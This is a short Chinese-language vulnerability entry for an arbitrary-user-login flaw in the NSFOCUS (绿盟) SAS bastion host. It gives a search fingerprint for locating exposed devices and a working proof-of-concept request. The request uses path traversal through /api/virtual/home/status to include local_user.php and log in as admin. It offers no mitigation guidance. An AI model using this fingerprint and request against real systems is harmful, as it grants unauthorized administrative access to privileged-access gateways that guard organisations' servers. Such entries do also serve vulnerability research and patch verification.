# 绿盟 SAS堡垒机 local_user.php 任意用户登录漏洞

## 漏洞描述

绿盟堡垒机存在任意用户登录漏洞，攻击者通过漏洞包含 www/local_user.php 实现任意⽤户登录

## 漏洞影响

<a-checkbox checked>绿盟 SAS堡垒机</a-checkbox></br>

## 网络测绘

body="'/needUsbkey.php?username='"</a-checkbox></br>

## 漏洞复现

登陆页面

![img](../../../.vuepress/public/img/1687843929584-e793a136-93ec-4b19-8ee9-5738c91681e8-20230810132919858.png)

验证POC

```plain
/api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin
```

![img](../../../.vuepress/public/img/1687844048220-9698fde6-1bdd-4068-bfa6-c5bdda190d42-20230810132919979.png)